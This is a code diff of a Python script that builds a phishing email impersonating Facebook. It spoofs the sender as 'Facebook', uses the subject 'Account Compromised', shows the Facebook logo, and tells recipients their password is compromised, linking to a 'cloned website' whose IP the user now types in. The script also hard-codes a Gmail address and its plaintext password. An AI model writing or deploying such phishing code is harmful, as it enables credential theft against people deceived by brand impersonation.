@@ -7,6 +7,8 @@ from email.mime.text import MIMEText
 sender = "MarcusSwe8080@gmail.com"
 password = "ThisIsThePassword!"
 
+
+IP = input("Enter IP of cloned website: ")
 # server = smtplib.SMTP("smtp.gmail.com", 587)
 
 # server.starttls()
@@ -18,21 +20,20 @@ password = "ThisIsThePassword!"
 message = MIMEMultipart("alternative")
 message["Subject"] = "Account Compromised"
 message["From"] = "Facebook"
-
 # Create the plain-text and HTML version of your message
 text = """
 Hi,
 How are you?
 Real Python has many great tutorials:
 www.realpython.com"""
-html = """\
+html = f"""\
 <html>
   <body>
     <img width="140" height="140" src="https://facebookbrand.com/wp-content/uploads/2019/04/f_logo_RGB-Hex-Blue_512.png?w=512&h=512" alt="facebook"></img>
     <p>Warning!<br>
        Your Facebook password has been compromised.
        Click here to update it: 
-       <a href="172.16.0.54">Facebook</a> 
+       <a href="{IP}">Facebook</a> 
        <br>
     </p>
   </body>
